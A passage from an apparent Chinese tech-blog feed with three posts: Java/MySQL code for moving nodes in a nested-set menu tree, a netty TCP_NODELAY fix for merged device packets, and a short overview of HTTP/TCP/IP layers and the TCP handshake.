class="string">&quot;);</span></span><br></pre></td></tr></table></figure><p>之所以要锁表是因为在修改左右值过程中不能有其它事务修改数据，否则会造成左右值错乱，整张表的数据都坏掉，所以这种数据结构有好有坏，要根据场景来使用。</p><h3><span id="移动节点到目标节点后面">移动节点到目标节点后面</span></h3><p>此代码还可以进一步优化，目前有点冗余</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">moveNodeAfter</span><span class="params">(Long moveId,Long targetId )</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = <span class="keyword">this</span>.moveNodeBefore(moveId, targetId,<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">if</span>(result&gt;<span class="number">0</span>) &#123;</span><br><span class="line">result += moveNodeBackward(moveId, targetId);</span><br><span class="line">unlockTables();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">moveNodeBackward</span><span class="params">(Long moveId,Long targetId)</span> </span>&#123;</span><br><span class="line">Menu moveMenu = <span class="keyword">this</span>.selectById(moveId);</span><br><span class="line"></span><br><span class="line">Menu targetMenu = <span class="keyword">this</span>.selectById(targetId);</span><br><span class="line"></span><br><span class="line">Integer nodeLeft = moveMenu.getLeftValue();</span><br><span class="line">Integer nodeRight = moveMenu.getRightValue();</span><br><span class="line"></span><br><span class="line">Integer targetLeft = targetMenu.getLeftValue();</span><br><span class="line">Integer targetRight = targetMenu.getRightValue();</span><br><span class="line"></span><br><span class="line">Integer nodeDist = nodeRight - nodeLeft+<span class="number">1</span>; <span class="comment">//确定要移动的范围</span></span><br><span class="line"></span><br><span class="line">Integer targetDist = targetRight - targetLeft+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">List&lt;Long&gt; ids = jdbcTemplate.queryForList(<span class="string">&quot;SELECT ID FROM &quot;</span>+tableName+<span class="string">&quot; WHERE LEFT_VALUE &gt;= ? AND RIGHT_VALUE&lt;=?&quot;</span>,Long.class,targetLeft,targetRight);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN LEFT_VALUE &gt;= :nodeLeft THEN LEFT_VALUE + :targetDist ELSE LEFT_VALUE END ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN RIGHT_VALUE &lt;= :nodeRight THEN RIGHT_VALUE + :targetDist ELSE RIGHT_VALUE END &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE LEFT_VALUE &gt;= :nodeLeft AND RIGHT_VALUE &lt;= :nodeRight&quot;</span>);</span><br><span class="line"></span><br><span class="line">MapSqlParameterSource  params = <span class="keyword">new</span> MapSqlParameterSource();</span><br><span class="line">params.addValue(<span class="string">&quot;nodeLeft&quot;</span>, nodeLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;nodeRight&quot;</span>, nodeRight);</span><br><span class="line">params.addValue(<span class="string">&quot;targetLeft&quot;</span>, targetLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;targetRight&quot;</span>, targetRight);</span><br><span class="line">params.addValue(<span class="string">&quot;nodeDist&quot;</span>, nodeDist);</span><br><span class="line">params.addValue(<span class="string">&quot;targetDist&quot;</span>, targetDist);</span><br><span class="line">params.addValue(<span class="string">&quot;ids&quot;</span>, ids);</span><br><span class="line"></span><br><span class="line">NamedParameterJdbcTemplate namedParameterJdbcTemplate = <span class="keyword">new</span> NamedParameterJdbcTemplate(jdbcTemplate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result=namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"></span><br><span class="line">sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = LEFT_VALUE - :nodeDist,RIGHT_VALUE = RIGHT_VALUE - :nodeDist &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE LEFT_VALUE &gt;= :targetLeft AND RIGHT_VALUE &lt;= :targetRight AND ID IN (:ids) &quot;</span>);</span><br><span class="line"></span><br><span class="line">result+=namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="移动节点到目标节点的子节点最后一位">移动节点到目标节点的子节点最后一位</span></h3><p>移到节点到目标节点的下面，作为其子节点，并排在其子节点的最后一位，被移动节点的子节点也会跟着一并移动，代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: moveNodeByParentAsLastChild</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 移动菜单到目标菜单下作为目标菜单的最后一个子菜单</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> reinershir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021年5月26日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> moveId 要移动的菜单ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetId 目标父菜单ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">moveNodeByParentAsLastChild</span><span class="params">(Long moveId,Long targetId)</span> </span>&#123;</span><br><span class="line"><span class="comment">//LOCK TABLE</span></span><br><span class="line"><span class="keyword">this</span>.lockTable();</span><br><span class="line">   </span><br><span class="line">Menu moveMenu = <span class="keyword">this</span>.selectById(moveId);</span><br><span class="line"></span><br><span class="line">Menu targetMenu = <span class="keyword">this</span>.selectById(targetId);</span><br><span class="line"></span><br><span class="line">Integer moveLeft = moveMenu.getLeftValue(); </span><br><span class="line"></span><br><span class="line">Integer moveRight = moveMenu.getRightValue();</span><br><span class="line"><span class="comment">////要移动菜单的范围，即被移动菜单及其子节点的左右值范围</span></span><br><span class="line">Integer moveDistance = moveRight - moveLeft+<span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">Integer level = moveMenu.getLevel();</span><br><span class="line"></span><br><span class="line">Integer targetRight = targetMenu.getRightValue();</span><br><span class="line"></span><br><span class="line">Integer targetLevel = targetMenu.getLevel();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((targetMenu.getLeftValue()&gt;=moveLeft&amp;&amp;targetRight&lt;=moveRight)||(moveId==targetId)) &#123;</span><br><span class="line">unlockTables();</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">Integer result = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//设置子节点的新值 </span></span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN LEFT_VALUE &gt; :targetRight THEN LEFT_VALUE + :moveDistance ELSE LEFT_VALUE END ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN RIGHT_VALUE &gt;= :targetRight THEN RIGHT_VALUE + :moveDistance ELSE RIGHT_VALUE END &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE RIGHT_VALUE &gt;= :targetRight&quot;</span>);</span><br><span class="line"></span><br><span class="line">MapSqlParameterSource  params = <span class="keyword">new</span> MapSqlParameterSource();</span><br><span class="line">params.addValue(<span class="string">&quot;moveLeft&quot;</span>, moveLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;moveRight&quot;</span>, moveRight);</span><br><span class="line">params.addValue(<span class="string">&quot;targetRight&quot;</span>, targetRight);</span><br><span class="line">params.addValue(<span class="string">&quot;moveDistance&quot;</span>, moveDistance);</span><br><span class="line"></span><br><span class="line">NamedParameterJdbcTemplate namedParameterJdbcTemplate = <span class="keyword">new</span> NamedParameterJdbcTemplate(jdbcTemplate);</span><br><span class="line"></span><br><span class="line">result+=namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line"></span><br><span class="line"><span class="comment">//再次查询 </span></span><br><span class="line">moveMenu = <span class="keyword">this</span>.selectById(moveId);</span><br><span class="line">moveLeft = moveMenu.getLeftValue(); </span><br><span class="line">moveRight = moveMenu.getRightValue();</span><br><span class="line"></span><br><span class="line">Integer newDistance = targetRight&gt;=moveLeft?targetRight-moveLeft:moveLeft - targetRight;</span><br><span class="line">Integer newDistanceOperator = targetRight &gt;=moveLeft?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">params.addValue(<span class="string">&quot;newDistanceOperator&quot;</span>, newDistanceOperator);</span><br><span class="line">params.addValue(<span class="string">&quot;newDistance&quot;</span>, newDistance);</span><br><span class="line">params.addValue(<span class="string">&quot;level&quot;</span>, level);</span><br><span class="line">params.addValue(<span class="string">&quot;targetLevel&quot;</span>, targetLevel);</span><br><span class="line"><span class="comment">//重新塞入</span></span><br><span class="line">params.addValue(<span class="string">&quot;moveLeft&quot;</span>, moveLeft);</span><br><span class="line">params.addValue(<span class="string">&quot;moveRight&quot;</span>, moveRight);</span><br><span class="line"><span class="comment">//移动节点</span></span><br><span class="line">sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN :newDistanceOperator = 1 THEN LEFT_VALUE + :newDistance ELSE LEFT_VALUE - :newDistance END ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN :newDistanceOperator = 1 THEN RIGHT_VALUE + :newDistance ELSE RIGHT_VALUE - :newDistance END ,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;LEVEL = LEVEL - :level +1 + :targetLevel WHERE RIGHT_VALUE &lt;= :moveRight AND LEFT_VALUE &gt;= :moveLeft&quot;</span>);</span><br><span class="line"></span><br><span class="line">result += namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line">sql = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;UPDATE &quot;</span>);</span><br><span class="line">sql.append(tableName);</span><br><span class="line">sql.append(<span class="string">&quot; SET LEFT_VALUE = CASE WHEN LEFT_VALUE &gt; :moveRight THEN LEFT_VALUE - :moveDistance ELSE LEFT_VALUE END,&quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;RIGHT_VALUE = CASE WHEN RIGHT_VALUE &gt;= :moveRight THEN RIGHT_VALUE - :moveDistance ELSE RIGHT_VALUE END &quot;</span>);</span><br><span class="line">sql.append(<span class="string">&quot;WHERE RIGHT_VALUE &gt;= :moveRight &quot;</span>);</span><br><span class="line"></span><br><span class="line">result+= namedParameterJdbcTemplate.update(sql.toString(),params);</span><br><span class="line">unlockTables();</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="附加说明">附加说明</span></h1><p>表字段对应上一章LEFT_VALUE对应L，RIGHT_VALUE对应R，其余字段名字相同</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;在之前的文章：&lt;a href=&quot;https://reiner.host/posts/9340b114.html&quot;&gt;使用左右值树形数据结构实现树形菜单&lt;/a&gt; 中记录了如何使用左右值增删改查节点，本次将记录一下如何移动节点，语言使用JAVA + MYSQL实现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总体思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;移动节点的大致思路是记录移动节点和目标节点之间的左右值以及其子节点的左右值，移动节点及其子节点左右值和目标节点及其子节点的左右值相互加减。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;举例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;节点A的左右值是LEFT=1,RIGHT=2，节点B的左右值是LEFT=5,RIGHT=6，现在要将节点A移动到节点B前面，那么它的移动范围就是RIGHT - LEFT + 1，即：2 - 1 +1 = 2，也就是说节点A左右值+2，左右值小于节点B的左右值-2 。&lt;/p&gt;
&lt;p&gt;结果：节点A的LEFT = 3 ,RIGHT = 4，节点B前面的节点左右值减了2变成了LEFT=1,RIGHT=2，相当于和节点A换了个位置，如此来达到移动节点的目的&lt;/p&gt;
&lt;p&gt;后续的移动到节点B后面、移动到节点B作为其子节点思路相同。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2021-6-22 更新&lt;/p&gt;
&lt;p&gt;修复了BUG，最新代码请关注： &lt;a href=&quot;https://github.com/reinershir/lui-auth&quot;&gt;https://github.com/reinershir/lui-auth&lt;/a&gt;  以下代码摘抄自菜单管理功能&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://reiner.host/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="-- 数据结构 -- 算法 -- modified preorder tree traversal -- 左右值树形" scheme="https://reiner.host/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%AE%97%E6%B3%95-modified-preorder-tree-traversal-%E5%B7%A6%E5%8F%B3%E5%80%BC%E6%A0%91%E5%BD%A2/"/>
    
  </entry>
  
  <entry>
    <title>解决使用netty作为TCP服务端时设备接收消息连包问题</title>
    <link href="https://reiner.host/posts/d0c795f9.html"/>
    <id>https://reiner.host/posts/d0c795f9.html</id>
    <published>2021-06-11T07:28:21.000Z</published>
    <updated>2021-12-24T12:18:33.182Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="前言">前言</span></h1><p>在前一章记录了如何使用netty作为TCP通信的服务端：<a href="https://reiner.host/posts/94ca3821.html">点击前往</a> ，本章记录一下如何解决硬件设备在接收到服务端发送过来的消息时有连包的问题。</p><h1><span id="问题描述">问题描述</span></h1><p>在通过监测硬件的收包信息时发现偶尔会出现心跳包和指令“粘”在一块的情况，例如指令的发送内容是：<code>EEFF0103GGHH</code>,心跳包的回复是：<code>EEFF0201GGHH</code>。</p><p>当心跳包返回信息的时候此时正好指令下发，那么设备端就会收到：<code>EEFF0103GGHHEEFF0201GGHH</code>。</p><p>这是由于调用netty的<code>writeAndFlush()</code>方法时并不是马上将数据发送过去，而将它放在一个缓冲池当中，而由于硬件的一发一收通信机制客户端无法对连包的数据做分割，因此这个问题要由服务端解决。</p><span id="more"></span><h1><span id="解决办法">解决办法</span></h1><p>找遍了谷歌、官方文档等资料就是没有说明连包问题的相关资料，大部分资料都是说明如何解决服务端接收TCP消息时产生的粘包、半包等问题。</p><p>最终发现原来netty配置中有个<code>ChannelOption.TCP_NODELAY</code>选项，官网上没有任何介绍，根据名字可知意思为“无延迟TCP”，于是启动类代码修改为如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建线程组</span></span><br><span class="line">       EventLoopGroup bossGroup = <span class="keyword">new</span> NioEventLoopGroup();</span><br><span class="line">       EventLoopGroup workerGroup = <span class="keyword">new</span> NioEventLoopGroup();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//创建启动类</span></span><br><span class="line">           ServerBootstrap b = <span class="keyword">new</span> ServerBootstrap(); </span><br><span class="line">           b.group(bossGroup, workerGroup)</span><br><span class="line">                   .channel(NioServerSocketChannel.class)</span><br><span class="line">                   .childHandler(<span class="keyword">new</span> ServerInitializer(deviceReportEvent))</span><br><span class="line">                   .childOption(ChannelOption.TCP_NODELAY, <span class="keyword">true</span>) <span class="comment">//无延时发送消息</span></span><br><span class="line">                   .option(ChannelOption.SO_BACKLOG, <span class="number">256</span>)</span><br><span class="line">                   .childOption(ChannelOption.SO_KEEPALIVE, <span class="keyword">true</span>);</span><br><span class="line">           <span class="comment">// 绑定端口，开始接收进来的连接</span></span><br><span class="line">           ChannelFuture f = b.bind(<span class="number">9000</span>).sync();</span><br><span class="line">           <span class="comment">// 等待服务器 socket 关闭 。</span></span><br><span class="line">           f.channel().closeFuture().sync();</span><br></pre></td></tr></table></figure><p>关键代码在于<code>.childOption(ChannelOption.TCP_NODELAY, true)</code>，最终通过抓包发现未在出现连包的情况。</p><p>由于我这边的特殊情况，在发送消息时我还加了一层保障，防止心跳回复与指令冲突，示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: writeAndFlush</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:   返回消息到客户端</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> reiner_shir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> channel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> respData</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeAndFlush</span><span class="params">(Channel channel,<span class="keyword">byte</span>[] respData)</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> ByteBuf respBuf = channel.alloc().buffer(respData.length);</span><br><span class="line">respBuf.writeBytes(respData);</span><br><span class="line"><span class="keyword">synchronized</span> (channel) &#123;</span><br><span class="line">ChannelFuture future = channel.writeAndFlush(respBuf);</span><br><span class="line"><span class="keyword">if</span>(future!=<span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">future.sync();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在前一章记录了如何使用netty作为TCP通信的服务端：&lt;a href=&quot;https://reiner.host/posts/94ca3821.html&quot;&gt;点击前往&lt;/a&gt; ，本章记录一下如何解决硬件设备在接收到服务端发送过来的消息时有连包的问题。&lt;/p&gt;
&lt;h1 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h1&gt;&lt;p&gt;在通过监测硬件的收包信息时发现偶尔会出现心跳包和指令“粘”在一块的情况，例如指令的发送内容是：&lt;code&gt;EEFF0103GGHH&lt;/code&gt;,心跳包的回复是：&lt;code&gt;EEFF0201GGHH&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当心跳包返回信息的时候此时正好指令下发，那么设备端就会收到：&lt;code&gt;EEFF0103GGHHEEFF0201GGHH&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这是由于调用netty的&lt;code&gt;writeAndFlush()&lt;/code&gt;方法时并不是马上将数据发送过去，而将它放在一个缓冲池当中，而由于硬件的一发一收通信机制客户端无法对连包的数据做分割，因此这个问题要由服务端解决。&lt;/p&gt;</summary>
    
    
    
    <category term="JAVA" scheme="https://reiner.host/categories/JAVA/"/>
    
    
    <category term="netty" scheme="https://reiner.host/tags/netty/"/>
    
    <category term="TCP服务端" scheme="https://reiner.host/tags/TCP%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    
    <category term="TCP粘包" scheme="https://reiner.host/tags/TCP%E7%B2%98%E5%8C%85/"/>
    
    <category term="TCP半包" scheme="https://reiner.host/tags/TCP%E5%8D%8A%E5%8C%85/"/>
    
    <category term="16进制通信" scheme="https://reiner.host/tags/16%E8%BF%9B%E5%88%B6%E9%80%9A%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>HTTP&amp;TCP/IP协议自我总结</title>
    <link href="https://reiner.host/posts/cc861966.html"/>
    <id>https://reiner.host/posts/cc861966.html</id>
    <published>2021-05-25T02:58:11.000Z</published>
    <updated>2021-12-24T12:18:32.976Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="http-https-tcpip总结">HTTP、HTTPS、TCP/IP总结</span></h1><h4><span id="协议分类">协议分类</span></h4><p>HTTP属于应用层协议，TCP属于传输层协议，IP属于网络层协议，一个HTTP协议由IP协议包体包含了TCP协议内容，而TCP协议包体又包括了HTTP协议内容，就像一个洋葱。</p><h4><span id="http请求历程">HTTP请求历程</span></h4><p>一个HTTP请求的完整历程，首先会根据URL解析请求的地址和端口，此时的地址拿到的一般是域名，因此还需要根据DNS服务器获取域名的真实IP。</p><p>NDS服务查询完毕后，此时浏览器会调用Socket库将HTTP协议里的内容包装成TCP或者UDP协议包。</p><p>光靠TCP协议还无法具备传输功能，因此TCP还需要借助IP协议来定位目标服务器在互联网中的位置，光靠IP依旧无法准确定位，因为一个IP可能有好几台设备使用，要明确要传输的目标还得在IP头部加上目标的MAC地址。</p><p>最后由网卡将数字信息转换为光信号经网线发送出去，将服务器通过交换机和路由器接收到请求包后像剥洋葱一样一层一层解析包中内容。</p><p>小结，一个HTTP请求总共要经历如下几层协议：</p><ul><li><p>应用层：定义数据格式，并按照对应的格式解读数据。 –HTTP</p></li><li><p>传输层：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序。 –TCP</p></li><li><p>网络层：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发。 –IP</p></li><li><p>链路层：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据。 –物理传输</p></li></ul><span id="more"></span><p>此外 IP 中还包括 ICMP 协议和 ARP 协议。</p><p>1、ICMP 用于告知网络包传送过程中产生的错误以及各种控制信息。<br>2、ARP 用于根据 IP 地址查询相应的以太网 MAC 地址。</p><h4><span id="tcp为什么需要三次握手">TCP为什么需要三次握手</span></h4><p>面试中问烂的问题了，在 HTTP 传输数据之前，首先需要 TCP 建立连接，TCP 连接的建立，通常称为三次握手。这个所谓的「连接」，只是双方计算机里维护一个状态机。</p><p>一开始，客户端和服务端都处于 CLOSED 状态。先是服务端主动监听某个端口，处于 LISTEN 状态。然后客户端主动发起连接 SYN，之后处于 SYN-SENT 状态。</p><p>服务端收到发起的连接，返回 SYN，并且 ACK 客户端的 SYN，之后处于 SYN-RCVD 状态。客户端收到服务端发送的 SYN 和 ACK 之后，发送 ACK 的 ACK，之后处于 ESTABLISHED状态，因为它一发一收成功了。</p><p>服务端收到 ACK 的 ACK 之后，处于 ESTABLISHED 状态，因为它也一发一收了。<strong>所以三次握手目的是保证双方都有发送和接收的能力。</strong></p><p><img src="data:image/jpg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAEkAjEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD0CiiigAprMqjLEAe9NmkEMTO3QCsZ5Zbx8k4X07CgDVa+tl6zLSfb7b/nqPyNZwtEHUkn1pfskfvQBf8At9t/z1H5Gj7fbf8APT9DWeLWPtu/Oj7LGOTn86AND+0Lb/np+hpDqNt2k/Q1Q+yxn+9+dAtE64P50AXv7Rt/7/6GlGo25Gd/6GqH2WM+v50fZY/f86AL39o2/wDf/Sj+0bf++fyqj9lj9/zo+zRnrn86AL39o2/9/wDSj+0bf+/+lUfssY5GT+NAtI8d/wA6ALw1K3x9/wDSl/tG2/56foaofZI/f86Pskecc/nQBof2hbf89P0NH9oW3/PT9DVD7LH7/nR9kj96ALv9o2/9/wDQ0o1C3Izv/Q1R+